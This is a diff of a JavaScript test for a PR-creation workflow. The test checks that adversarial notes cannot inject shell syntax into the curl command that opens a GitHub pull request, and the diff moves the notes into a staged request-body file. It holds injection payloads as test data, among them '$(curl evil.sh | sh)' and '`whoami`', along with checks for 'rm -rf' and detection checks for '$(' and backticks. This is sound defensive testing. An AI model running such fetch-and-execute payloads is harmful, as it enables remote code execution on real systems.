@@ -3,9 +3,10 @@ import assert from 'node:assert/strict';
 import { CommandError } from '@apralabs/apra-fleet-workflow';
 import { sanitizePrText } from '../fleet-sprint/runner.js';
 import { sanitizePrMarkdown } from '../fleet-sprint/pr-body.mjs';
-import { runDevelopLoopScenario, withScenarioMarkers } from './helpers/mock-sprint-harness.mjs';
+import { runDevelopLoopScenario, withScenarioMarkers, stagedCurlBody } from './helpers/mock-sprint-harness.mjs';
 import { getSeCommands } from '../fleet-sprint/se-os-commands.mjs';
 import { SPRINT_ANALYSIS_EXCLUDE_PATTERN } from '../fleet-sprint/phases/harvest.mjs';
+import { VCS_PAYLOAD_SUBDIR } from '../fleet-sprint/vcs-payload.mjs';
 
 const check = (cond, msg) => assert.ok(cond, msg);
 
@@ -229,24 +230,25 @@ test('mock sprint: adversarial final-verdict notes cannot inject into gh pr crea
         check(prInjection.result && prInjection.result.verdict === 'PASS', `Expected a PASS final verdict, got: ${JSON.stringify(prInjection.result)}`);
         const prInjectionCmd = prInjection.commandLog.find((c) => c.startsWith('curl -sS -X POST') && c.includes('/pulls'));
         check(!!prInjectionCmd, `Expected a VCSModule create-pull-request command in the log (PR must still be published), commandLog: ${JSON.stringify(prInjection.commandLog)}`);
-        // The notes are DATA inside the single shQuote()-wrapped -d JSON
-        // argument, never shell syntax: tokenize the dispatched command the
-        // way a POSIX shell does (the mock member is POSIX; the PowerShell
-        // dialect is proven byte-exact in publish-pr-body-and-update.test.mjs
-        // and vcs-powershell-argv-roundtrip.test.mjs) and require (a) the
-        // exact expected argv shape -- nothing from the notes leaked out of
-        // its quotes into a word of its own -- and (b) the -d word to decode
-        // to JSON whose body carries the notes verbatim, metacharacters
-        // included, as inert text. (Notes used to be stripped of every shell
+        // The notes are DATA in the staged request-body file (curl
+        // --data-binary @<path>), never on the command line at all: tokenize
+        // the dispatched command the way a POSIX shell does (the mock member
+        // is POSIX) and require (a) the exact expected argv shape -- nothing
+        // from the notes reached a word of its own -- and (b) the staged body
+        // to decode to JSON whose body carries the notes verbatim,
+        // metacharacters included, as inert text. (Notes used to be stripped of every shell
         // metacharacter AND every newline, which is what flattened PR bodies.)
         const words = posixWords(prInjectionCmd);
         check(
             words[0] === 'curl' && words[1] === '-sS' && words[2] === '-X' && words[3] === 'POST'
-                && words.filter((w) => w === '-H').length === 4 && words.filter((w) => w === '-d').length === 1
+                && words.filter((w) => w === '-H').length === 4 && words.filter((w) => w === '--data-binary').length === 1
+                && words.filter((w) => w === '-d').length === 0
+                && /^@\/.+\.json$/.test(words[words.indexOf('--data-binary') + 1])
                 && words.length === 17 && /^https:\/\/api\.github\.com\/repos\/[^ ]+\/pulls$/.test(words[16]),
             `Expected the curl argv shape to be intact (no word injected by the notes), got: ${JSON.stringify(words)}`
         );
-        const payload = JSON.parse(words[words.indexOf('-d') + 1]);
+        check(!prInjectionCmd.includes('rm -rf') && !prInjectionCmd.includes('whoami'), `the notes must not appear on the command line at all, got: ${prInjectionCmd}`);
+        const payload = JSON.parse(stagedCurlBody(prInjectionCmd));
         const expectedNotes = sanitizePrMarkdown(adversarialNotes);
         check(
             expectedNotes.includes('$(curl evil.sh | sh)') && expectedNotes.includes('`whoami`'),
@@ -281,11 +283,15 @@ function isPrRestCurl(cmd) {
 // from a constant pattern by se-os-commands (no sprint-derived text), and its
 // `$(...)` reads only a script-local value git itself prints.
 const HARVEST_GIT_EXCLUDE = getSeCommands({ os: 'linux', shell: 'bash' }).ensureGitExcluded(SPRINT_ANALYSIS_EXCLUDE_PATTERN);
+// The engine's own git-exclude of the VCS request-body staging directory
+// (vcs-payload.mjs): a fixed engine command, no notes text can reach it.
+const VCS_PAYLOAD_GIT_EXCLUDE = getSeCommands({ os: 'linux', shell: '' }).ensureGitExcluded(`${VCS_PAYLOAD_SUBDIR}/`);
 
 function assertNoShellSubstitution(commandLog) {
     for (const cmd of commandLog) {
         if (isPrRestCurl(cmd)) continue;
         if (cmd === HARVEST_GIT_EXCLUDE) continue;
+        if (cmd === VCS_PAYLOAD_GIT_EXCLUDE) continue;
         check(!cmd.includes('$('), `No dispatched command outside the PR REST calls may contain '$(' (found in: ${cmd})`);
         check(!/`/.test(cmd), `No dispatched command outside the PR REST calls may contain a backtick (found in: ${cmd})`);
     }
